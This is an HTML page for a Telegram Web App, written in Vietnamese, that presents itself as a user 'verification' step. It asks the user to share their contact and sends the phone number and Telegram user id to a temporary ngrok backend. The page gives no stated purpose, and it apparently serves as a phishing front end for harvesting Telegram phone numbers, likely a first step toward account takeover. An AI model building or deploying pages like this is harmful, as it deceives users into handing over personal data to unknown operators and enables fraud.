<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xác Minh</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #0d1117; color: white; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .screen { display: none; text-align: center; }
        .active { display: block; }
        .btn { padding: 15px 30px; background: #3bc0a8; border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="screen active" id="step1">
    <button class="btn" id="shareContact">Xác Nhận Người Dùng</button>
</div>

<div class="screen" id="step2">
    <div>Đang xử lý dữ liệu...</div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    // Thay đổi link này thành link Ngrok mới nhất của bạn
    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
    const chat_id = tg.initDataUnsafe?.user?.id || Math.floor(Math.random() * 1000000);

    function goStep(n) {
        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
        document.getElementById('step' + n).classList.add('active');
    }

    document.getElementById("shareContact").addEventListener("click", () => {
        alert("Đã nhấn nút, đang gọi requestContact..."); 
        tg.requestContact();
    });

    tg.onEvent('contactRequested', async (e) => {
        if (e.status === 'sent') {
            alert("Đã nhận SĐT: " + e.responseUnsafe.contact.phone_number);
            try {
                const response = await fetch(`${BACKEND_URL}/send_phone`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: chat_id, phone: e.responseUnsafe.contact.phone_number })
                });
                alert("Server phản hồi: " + response.status);
                if (response.ok) {
                    goStep(2);
                }
            } catch (err) {
                alert("Lỗi kết nối: " + err);
            }
        }
    });
</script>
</body>
</html>
